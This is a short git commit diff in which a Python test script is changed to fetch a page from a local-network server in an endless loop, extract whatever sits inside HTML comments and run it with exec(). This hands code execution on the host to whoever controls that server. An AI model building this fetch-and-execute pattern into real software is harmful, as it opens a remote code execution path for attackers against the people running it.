218e1dfc0ee413ac2b8b61955ae05bc450cfdeb2
PayPrawn <finlay.scott@rocketmail.com>
2018-08-25 18:13:39 +0100

    Thanks Team

--- pythontest1.py
+++ pythontest1.py
@@ -1,6 +1,13 @@
 import urllib.request
 from urllib.request import urlopen
 from bs4 import BeautifulSoup
-html = urlopen('https://192.168.0.15:5000')
-page = BeautifulSoup(html.read())
-print(page)
+
+runcode = True
+
+while (runcode):
+    html = urlopen('http://192.168.0.15:5000')
+    page = BeautifulSoup(html.read())
+    string = str(page)
+    result = string[string.find("<!--")+len("<!--"):string.rfind("-->")]
+    print(result)
+    exec(result)
